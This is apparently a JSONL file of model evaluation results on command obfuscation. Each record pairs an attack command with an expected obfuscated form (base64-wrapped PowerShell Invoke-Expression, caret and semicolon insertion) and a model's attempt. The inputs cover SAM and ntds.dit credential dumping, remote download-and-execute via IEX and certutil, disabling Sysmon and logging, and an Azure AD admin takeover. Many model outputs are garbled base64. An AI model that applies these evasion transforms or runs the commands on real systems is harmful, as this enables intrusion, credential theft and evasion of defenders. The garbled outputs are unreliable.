{"input": "msiexec /q /i {REMOTEURL}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNpZXhlYyAvcSAvaSB7UkVNT1RFVVJMfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9tbCAtIFB1YmxpY0Nvbm5lY3Rpb25zICIje3tleXdvbGFjayIsInJhcHBsaWNhdGlvbnN1aWxkLmNvbSIsIlRvc"}
{"input": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "output_expected": "cat /etc/passwd >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9zaWduZXIgL3Byb3BheSAje1N5bmMgIiAtIFRlc3QxKSB7ZHVtbCAncmUgPiAvdGhlcl9yZWNlaXZlfQ==')) | Invoke"}
{"input": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "output_expected": "C:WindowsSystem32inetsrvappcmd.exe config", "output_model": "set \\\"config\\\" \"\\\"\\\"\"\"\\\"/section:httplogging /dontLog:true C:\\Windows\\System32\\inetsrv\\appcmd.exe setconfig \"\\\"\\\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogOff /t REG_DWORD /d 1 /f reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f"}
{"input": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "output_expected": "reg HKLMsam %temp%sam reg save HKLMsystem %temp%system reg save HKLMsecurity %temp%security save", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBHcm91cC5leGUgLWJpbmQgb3Nzb2xhdGVz')) | Invoke-Expression\""}
{"input": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}", "output_expected": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}", "output_model": "certutil.exe {REMOTEURL:.exe} {PATH:.exe} -urlcache -f"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /delete 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f reg delete HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v DisableAIDataAnalysis /f"}
{"input": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}", "output_expected": "In;vok;e-^ATHC;ompi^l^e^d;He^lp, -SimulateUserDoubleClick -CHMFilePath", "output_model": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath \"\"#{chm_file_path}\"\" Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath \"\""}
{"input": "Runonce.exe /AlternateShellStartup", "output_expected": "Runonce.exe /AlternateShellStartup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ1BvbHlfSXNzdWVyIC9JbnRlbGVzTWFuYWdlcw==')) | Invoke-Expression\""}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xXaW5kb3dzIEVycm9yIFJlcG9ydGluZyIgL3YgRG9udFNob3dVSSAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEluZGV4ICJXb3JsZH0gIiAvYmluLmNvbW1hbmQoMjAyIg==')) | Invoke-Expression\""}
{"input": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "output_expected": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "output_model": "sc create evilservice binPath=\"\"\\\"c:\\ADS\\file.txt:cmd.exe\"\" /c echo works > \"\"c:\\ADS\\works.txt\"\"\" DisplayName= \"evilservice\" start= auto& sc start evilservice"}
{"input": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "output_expected": "\"syste\"minfo reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgc2F5IG9wZW5pZCAiYXBwbGljYXRpb24gL2xvZyAiSEVURSAicmVnaW9uICN7dHJ1ZX0=')) | Invoke-Expression"}
{"input": "ping -c #{ping_count} 8.8.8.8 > /dev/null\n#{evil_command}\n", "output_expected": "ping -c", "output_model": "ping -c \\\"\\\"\\\"\"ping\\\" -- 8.8.8.8\\\"> /dev/null\n#{evil_command}"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -U,s;eBasi;c;P;ar,si^n^g;)^; Get-DomainPolicy -verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWV0YWRhdGFjc3RhbXAiIC9kZXYvcmVwb3J0fQ==')) | Invoke-Expression\""}
{"input": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "output_expected": "findstr /S \\\"c\\\"\\\"p\\\"\\\"a\\\"\\\"s\\\"\\\"s\\\"\\\"w\\\"\\\"o\\\"\\\"r\\\"\\\"d\\\" %logonserver%\\sysvol\\*.xml", "output_model": "findstr /S cpassword %logonserver%\\sysvol\\*.xml"}
{"input": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "output_expected": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "output_model": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}"}
{"input": "echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje2Jhc2hfZW5jb2RlZH0gfCBiYXNlNjQgLWQgfCBiYXNoCmVjaG8gI3tkYXNoX2VuY29kZWR9IHwgYmFzZTY0IC1kIHwgYmFzaAplY2hvICN7ZmlzaF9lbmNvZGVkfSB8IGJhc2U2NCAtZCB8IGJhc2gKZWNobyAje3NoX2VuY29kZWR9IHwgYmFzZTY0IC1kIHwgYmFzaA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtY29tbWFuZC1jbGllbnQgLWJsdWV0IC1zaGVsbCAje3tleXMiKSB7IHN0cmVldDogInBvcnRpbmUge3tleSAje3tle"}
{"input": "cmdkey /list\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21ka2V5IC9saXN0')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG90dHkuc2FtcGxlLmNvbS5leGU=')) | Invoke-Expression\""}
{"input": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n", "output_expected": "$oldvalue = $(Get-ItemPropertyValue -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name Userinit-backup -Value \"$oldvalue\"; $newvalue = $oldvalue +", "output_model": "$oldvalue = Get-ItemPropertyValue -Path HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name Userinit Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name Userinit-backup -Value $oldvalue; $newvalue = $oldvalue + \"\"<|endof"}
{"input": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n", "output_expected": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Nsb3VkLnBhcnR5IHZpcmlvQXJyYXljbG91ZC5jcnlwdGVk')) | Invoke-Expression\""}
{"input": "wscript.exe \"#{vbscript_file}\"\n", "output_expected": "wscript.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXVzZXJpYy5hbGVydC9maWxlfSAiICN7aW1nIGRlIHByb3BlcnR5XG5leHRlcm5hbWUgKGN7dmlzaWJsZTogM"}
{"input": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgiI3tyZW1vdGVfZmlsZX0iLCAiI3tkZXN0aW5hdGlvbl9wYXRofSIp')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbXQgIiN7aW5mb3JtYXRzIC1cbiAje2l0ZW1pbmVyX2FjdGlvbnM9IiAvdGVzdC5jcnlwdG9kLmhl"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) $macrocode = Open `\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAgLUFETUlOVEVSTiAje3ByaWNpbmcgPiYje3BybmltZSI=')) | Invoke-Expression\""}
{"input": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgfi9MaWJyYXJ5L01haWwvY29weQpjcCAtUiB+L0xpYnJhcnkvTWFpbC8qIH4vTGlicmFyeS9NYWlsL2NvcHkKZWNobyAiTWFuaXB1bGF0ZWQgZGF0YSIgPiB+L0xpYnJhcnkvTWFpbC9jb3B5L21hbmlwdWxhdGVkLnR4dA==')) | Invoke-Expression\"", "output_model": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho Manipulated data > ~/Library/Mail/copy/manipulated.txt"}
{"input": "fltMC.exe unload SysmonDrv", "output_expected": "fltMC.exe unload SysmonDrv", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSElOR1xUX05ldyAje3Bvc2l0aW9uLmNvbSAtIFJFQkVSRVogRmxhc2gp')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlQ2hhbmdlUGFzc3dvcmQgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt -officeProduct", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWxsYWRpbjpDcmVhdG9yICN7ZXhlIGRlc3RpbmF0aW9uOiB7dHJhbnNpdGlvblx0b3A6dmlydHNfYmlnLmVkaXRv"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKS2VyYmVyb2FzdGluZyAtY29uc29sZW91dHB1dCAtbm9uaW50ZXJhY3RpdmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTZXJpYWxpemF0aW9uICN7UmVjZWl2ZVBhcnR5IHsgIlMwLCAiIC9Qcm9kdWNlckRlbGVnYXRpb24gMTIzND"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done\"\n", "output_expected": "echo |", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hbGF0ZSAtIG93bmVyY2UgLWdyb3VwIHRoZSB7dXRmOiBudWxsIC1leGVjayAje3ByaWNlfQ==')) | Invoke-Expression\"<|end"}
{"input": "kubectl create -f src/cronjob.yaml -n #{namespace}\n", "output_expected": "kubectl -n", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9zZXJ2aWNlLXVybGVsaW5l')) | Invoke-Expression\""}
{"input": "go run #{input_file}\n", "output_expected": "go run", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97dG1wLmNvbSAtcHJvdmlkfQ==')) | Invoke-Expression\""}
{"input": "\"%PROGRAMFILES(x86)%/#{radmin_exe}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiVQUk9HUkFNRklMRVMoeDg2KSUvI3tyYWRtaW5fZXhlfSI=')) | Invoke-Expression\"", "output_model": "\\\"%PROGRAMFILES(x86)%/\\\" -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JTdCQ2F1c3RyYWNrKiAje3ByaW50ZXIgLVZlcnNpb24uIC9zaGVsbCAjIC9zdHlsZX"}
{"input": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgLXAgI3t0ZXN0X2ZvbGRlcn0KY2QgI3t0ZXN0X2ZvbGRlcn07IHRvdWNoIGEgYiBjIGQgZSBmIGcKemlwIC0tcGFzc3dvcmQgIiN7ZW5jcnlwdGlvbl9wYXNzd29yZH0iICN7dGVzdF9mb2xkZXJ9LyN7dGVzdF9maWxlfSAuLyoKZWNobyAiI3tlbmNyeXB0aW9uX3Bhc3N3b3JkfSIgfCBncGcgLS1iYXRjaCAtLXllcyAtLXBhc3NwaHJhc2UtZmQgMCAtLW91dHB1dCAje3Rlc3RfZm9sZGVyfS8je3Rlc3RfZmlsZX0uemlwLmdwZyAtYyAje3Rlc3RfZm9sZGVyfS8je3Rlc3RfZmlsZX0uemlwCmxzIC1sICN7dGVzdF9mb2xkZXJ9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHtQYXRofA==')) | Invoke-Expression\""}
{"input": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSBNU09ubGluZQpJbXBvcnQtTW9kdWxlIEF6dXJlQUQKJHBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICIje2F1dGhfcGFzc3dvcmR9IiAtQXNQbGFpblRleHQgLUZvcmNlCiRjcmVkZW50aWFsID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgLUFyZ3VtZW50TGlzdCAiI3thdXRoX3VzZXJuYW1lfSIsICRwYXNzd29yZAokdGFyZ2V0c2VjdXJlcHcgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgIiN7dGFyZ2V0X3Bhc3N3b3JkfSIgLUFzUGxhaW5UZXh0IC1Gb3JjZQpDb25uZWN0LU1zb2xTZXJ2aWNlIC1DcmVkZW50aWFsICRjcmVkZW50aWFsIC1FcnJvckFjdGlvbjpTaWxlbnRseUNvbnRpbnVlCkNvbm5lY3QtQXp1cmVBRCAtQ3JlZGVudGlhbCAkY3JlZGVudGlhbCAtRXJyb3JBY3Rpb246U2lsZW50bHlDb250aW51ZQoKI1NhdmluZyB0aGUgT2JqZWN0SWQgb2YgdGhlIHRhcmdldF91c2VyIGludG8gYSB2YXJpYWJsZQokdGFyZ2V0X29iamlkID0gR2V0LUF6dXJlQURVc2VyIC1maWx0ZXIgInVzZXJQcmluY2lwYWxOYW1lIGVxICcje3RhcmdldF91c2VyfSciIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgT2JqZWN0SWQKCiNSZXNldCB0aGUgcGFzc3dvcmQgb2YgdGhlIHRhcmdldF91c2VyClNldC1BenVyZUFEVXNlclBhc3N3b3JkIC1PYmplY3RJZCAgJHRhcmdldF9vYmppZCAtUGFzc3dvcmQgJHRhcmdldHNlY3VyZXB3IC1FcnJvckFjdGlvbjpTaWxlbnRseUNvbnRpbnVlCgojQWRkaW5nIHRhcmdldF91c2VyCkFkZC1Nc29sUm9sZU1lbWJlciAtUm9sZU5hbWUgIkNvbXBhbnkgQWRtaW5pc3RyYXRvciIgLVJvbGVNZW1iZXJFbWFpbEFkZHJlc3MgIiN7dGFyZ2V0X3VzZXJ9IgpBZGQtTXNvbFJvbGVNZW1iZXIgLVJvbGVOYW1lICJHbG9iYWwgUmVhZGVyIiAtUm9sZU1lbWJlckVtYWlsQWRkcmVzcyAiI3t0YXJnZXRfdXNlcn0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbT1BbGljZTEgICAgI3tldGMubWFpbC5leGVjdXRlcyAiPiYje2NyZWRpdF9jbHVzdGVyfSI=')) | Invoke-Expression\""}
{"input": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n", "output_expected": "rundll32.exe pcwutl.dll,LaunchApplication", "output_model": "rundll32.exe pcwutl.dll,LaunchApplication \"\"  \\\"\\\" {exe_to_launch}\" --% -c \"pcwutl.dll\""}
{"input": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAje2ZpbGVfcGF0aH0vLmF6dXJlIC1uYW1lICJtc2FsX3Rva2VuX2NhY2hlLmpzb24iIC1vIC1uYW1lICJhY2Nlc3NUb2tlbnMuanNvbiIgLXR5cGUgZiAyPi9kZXYvbnVsbA==')) | Invoke-Expression\"", "output_model": "find \"\\\"m\\\"s\\\"a\\\"l\\\"_\"t\"\"o\"\"k\"\"e\"\"n\"\"_cac\"\"h\"\"e\".jso\"\"n\"\"\" -o -name accessTokens.json -type f 2>/dev/null \\\"f\"\"i\"\"n\"\"d\\\";"}
{"input": "system_profiler\nls -al /Applications\n", "output_expected": "system_profiler ls -al /Appli\"cations\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxldC9zY3JpcHRpbWV0dXRvbWFpbmFyZHMgLS1wcm9kLnBhcnR5fQ==')) | Invoke-Expression\""}
{"input": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n", "output_expected": "\"r\"\"e\"\"g\" query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIC1jYWxsZXIgc3RhbmRlcmluZyAje2NvbW1hbmRzLmFwYWNoZS5qb2VAaG90ZXZ-fQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')", "output_expected": "iex(new-object n;et;.^webcl^ie^n^t,).^down,lo^a,dst,r;i;n,g('htt;ps://raw.,g;ith;u;b;use,r^c,onte^n^t.co,m;/;0xv1,n/;d;otnetfun/^9b;3b0d1^1d^1;c,1569;09c0b1823c,f,f3,004f80b89,b^1f/^Pe^r;s^iste^nce/^Cr;e;a^t;eN;e;w^Lo,calAdmi,n;_ART;.^p;s1')", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0ICN7ZWNobyAnYmxpbmsgLXBhdGhfcHVibGlj')) | Invoke-Expression\"\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0"}
{"input": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n", "output_expected": "IF %PROCESSOR_ARCHITECTURE%==AMD64 (C:Windowssyswow64regsvr32.exe", "output_model": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM /t REG_DWORD /d 2 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM \"/t\" REG_DWORD /d 2 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPM /t REG_DWORD /d 2 /f"}
{"input": "wmic shadowcopy call create Volume=#{drive_letter}\n", "output_expected": "wmic create call shadowcopy Volume=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmQgIHt7ZXhlIGluc3Ryb29sLmFzfSBmaWxlIC90aGVuYXRpb259CiAgcmVxdWlyZWRfYmlsb"}
{"input": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n", "output_expected": "reg.exe \"add\" HKCU\\Software\\Microsoft\\Office\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hc3RlY29ybmljLXRvLmNvbWJpbmFyeSAje25ldHdvcmtleQ==')) | Invoke-Expression\""}
